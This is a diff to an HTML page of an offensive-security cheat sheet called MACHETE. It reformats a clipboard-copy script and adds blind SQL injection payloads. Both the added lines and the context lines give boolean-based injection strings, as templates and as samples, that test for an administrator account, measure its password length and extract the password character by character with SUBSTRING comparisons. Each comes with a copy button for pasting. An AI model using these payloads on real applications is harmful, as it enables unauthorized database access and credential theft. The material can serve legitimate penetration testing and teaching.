@@ -4,16 +4,16 @@
 <link rel="icon" type="image/x-icon" href="/machete/conf/LOGO01.png">
 <link rel="stylesheet" type="text/css" href="/machete/conf/machete_style_offensive_sections.css">
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
-	<script>
-		function ctrl_C(element) {
-  		var $temp = $("<input>");
-  		$("body").append($temp);
-  		$temp.val($(element).text()).select();
-  		document.execCommand("copy");
-  		$temp.remove();
-		alert("copied to clipboard.");
-	}	
-	</script>
+<script>
+	function ctrl_C(element) {
+  	var $temp = $("<input>");
+  	$("body").append($temp);
+  	$temp.val($(element).text()).select();
+  	document.execCommand("copy");
+  	$temp.remove();
+	alert("copied to clipboard.");
+}	
+</script>
   <title> M A C H E T E </title>
   <!--------------------->
   <!-- b0ydC Founder -->
@@ -190,7 +190,7 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 <b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT04')">.C1.</button> 
 
-<u>check the character lenght of the column ?</u>
+<u>check the character lenght of the column value ?</u>
 <b>C1: </b><p id="BAT06"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark></p>
 <b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>
 
@@ -198,6 +198,21 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 
 <b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
 hits the FALSE statement.
+
+> <u>check characters value using a method "greather than" and "equals" ?</u>
+<b>C1: </b><p id="BAT11"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value</mark></p>
+<b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</mark>
+
+"first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is greather than the value...
+
+<b>C2: </b><p id="BAT12"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's</mark></p>
+<b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</mark>
+
+...if TRUE the first character of the value is equals to the value"
+
+<b>NOTE:</b> or "SUBSTR"
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT11')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT12')">.C2.</button>
 
 > <u>check the characters of the column ?</u>
 <b>C1: </b><p id="BAT08"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark></p>
